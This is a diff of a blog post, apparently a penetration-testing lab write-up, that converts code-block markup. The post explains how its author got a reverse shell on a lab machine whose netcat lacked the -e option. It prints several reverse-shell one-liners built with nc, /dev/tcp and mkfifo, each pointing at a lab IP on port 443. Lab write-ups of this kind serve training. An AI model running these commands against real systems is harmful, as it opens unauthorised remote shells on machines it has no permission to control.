@@ -21,9 +21,10 @@ I immediately found that netcat was installed, but ofcourse [without the e-optio
 3. Redirect the output of netcat to the temporary file, so the tail command picks it up...
 
 The result looks like:
-{% highlight bash %}
+
+```bash
 tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 10.11.0.49 443 1> /tmp/1
-{% endhighlight %}
+```
 
 And don't forget, all your commands are stored in the /tmp/1 file... (ツ)
 
@@ -31,15 +32,15 @@ From many other options I found, none seemed to work. A quick test showed that t
 [/dev/tcp/&lt;ip&gt;/&lt;port&gt;](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) 
 did not work either. The following command did not result in any response on my machine.
 
-{% highlight bash %}
+```bash
 echo foo > /dev/tcp/10.11.0.13/443
-{% endhighlight %}
+```
 
 Ofcourse, after having rooted the machine, I was still wondering whether other options found on the internet could work too. In my case I was able to execute multiple commands by separating them with a semicolon. This way a pipe is created first, followed by: netcat reading input from that pipe, netcat redirecting output to bash, bash redirecting stderr and stdout to the pipe again.
 
-{% highlight bash %}
+```bash
 mkfifo pipe; nc -nv 10.11.0.13 443 < pipe | /bin/sh 2>pipe >pipe 
-{% endhighlight %}
+```
 
 To wrap up, which things slowed me down finding a way to obtain a reverse shell?
 1. Not understanding the "mkfifo pipe" command. This command makes a pipe in the _current_ directory. So not having any rights there, just really does not help...
